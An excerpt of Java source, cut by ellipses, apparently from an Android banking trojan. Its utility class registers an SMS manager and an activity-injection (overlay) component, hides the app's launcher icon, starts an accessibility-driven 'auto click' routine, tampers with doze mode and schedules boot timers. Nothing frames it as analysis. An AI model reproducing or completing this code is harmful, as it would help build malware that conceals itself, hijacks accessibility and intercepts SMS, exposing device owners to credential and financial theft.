...
import com.example.mmm.Main.SMSManager;
import com.example.mmm.Main.ReceiverDeviceAdmin;
import com.example.mmm.Main.ClassRC4;
import com.example.mmm.Main.RequestHttp;
import com.example.mmm.Main.ModeChanger;
import com.example.mmm.Main.ViewManager;
import com.example.mmm.R;
import com.example.mmm.defines;
import com.example.mmm.IndexACT;
...
public class utils {
    ...
    public void initialization(Context context){ // initialization
        try {
            ...
            SettingsWrite(context, consts.packageNameActivityInject, ViewManager.class.getCanonicalName());
            ...
            SettingsWrite(context, "sms_sdk_Q",""+ SMSManager.class.getName());
    ...
    private void deleteLabelIcon(Context context){
        ComponentName CTD = new ComponentName(context, IndexACT.class);
    ...
    public void start_dozemode(String TAG_LOG, Context context){
            if ((!idutl.is_dozemode(context) && ((Integer.parseInt(SettingsRead(context, consts.schetBootReceiver))>2))) || (isAccessibilityServiceEnabled(context, Access.class))) {
                SettingsWrite(context, consts.autoClick, consts.str_1);//auto click start!
                Log(TAG_LOG, consts.str_log2);
                Intent dialogIntent = new Intent(context, ModeChanger.class);
    ...
    public static void startCustomTimer(Context context, String name, long millisec){
        try{
            Intent intent = new Intent(context, BooterConfig.class);
